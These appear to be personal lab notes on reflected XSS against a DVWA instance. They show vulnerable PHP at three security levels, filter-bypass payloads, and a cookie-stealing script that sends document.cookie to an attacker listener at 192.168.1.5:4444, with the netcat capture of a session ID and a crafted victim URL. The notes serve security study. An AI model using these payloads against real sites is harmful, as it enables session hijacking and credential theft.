# Cross-Site Scripting XSS
- Cross-Site Scripting (XSS) is a web vulnerability where poor input validation allows an attacker to inject malicious JavaScript—either reflected through a crafted URL to target a specific victim or stored in places like comments to affect all visitors—potentially enabling cookie theft or other harmful actions.
- Main Types
1. Reflected XSS – Payload comes from the URL and reflects immediately in the response.
2. Stored XSS – Payload is saved on the server (e.g., comments) and affects every visitor.
3. DOM-based XSS – Vulnerability is in the browser-side JavaScript.
- What XSS can do ?
1. Hijacking the user`s session
2. Perform unauthorized activities 
3. Phising to steal user`s credentials 
---
### DVWA lab 192.168.1.7 , admin:password
- XSS reflected , Security : low
- `<script> alert(1) </script>` inside the input field 
- Source code
```
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```
- another Malicious payloads
- `<a href="javascript:alert(document.cookie)">Click me</a>`
- `<img src=x onerror="alert(document.cookie)">`
```

```
---
- XSS reflected , Secuirty : Meduim
- `<scr<script>ipt> alert(1) </script>`
- Source code
```
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
```
-
- source code shows that it deletes `<script>`
---
- XSS reflected , Security : High
- SVG is useful because many apps sanitize `<script>` but forget that SVG is an HTML-active context that can execute JavaScript if it’s embedded inline
- `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>`
- `<svg onload=alert(document.cookie) />`
- Source code
```
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```
- this time there\`s now way use `<script>` even if u do `<scr<script>ipt> alert(1) </script>` it will not work

---
# Real Reflected XSS example
- `<script> new Image().src = "http://192.168.1.5:4444/" + escape(document.cookie); </script>`
- or
- `<script> new Image().src = "http://192.168.1.5:4444/?cookie=" + escape(document.cookie); </script> `
- This will end the cookie to `htt://192.168.1.5:4444`
- on the attackr machine `192.168.1.5`
```bash
┌──(amro㉿amro)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.5] 47110
GET /?cookie=security%3Dlow%3B%20security_level%3D0%3B%20PHPSESSID%3Dtrql25n5649tmu0ibivbbiapf8 HTTP/1.1
Host: 192.168.1.5:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.1.7/
Priority: u=5, i

```
- Now i got the Cookie on the attacker machine
- Note that`s the URL u will send to the victim
- `http://192.168.1.7/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3E+new+Image%28%29.src+%3D+%22http%3A%2F%2F192.168.1.5%3A4444%2F%22+%2B+escape%28document.cookie%29%3B+%3C%2Fscript%3E#`
- that\`s the url generated after putting `<script> new Image().src = "http://192.168.1.5:4444/" + escape(document.cookie); </script>` in the input field

--- 
# Useful resources
[AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
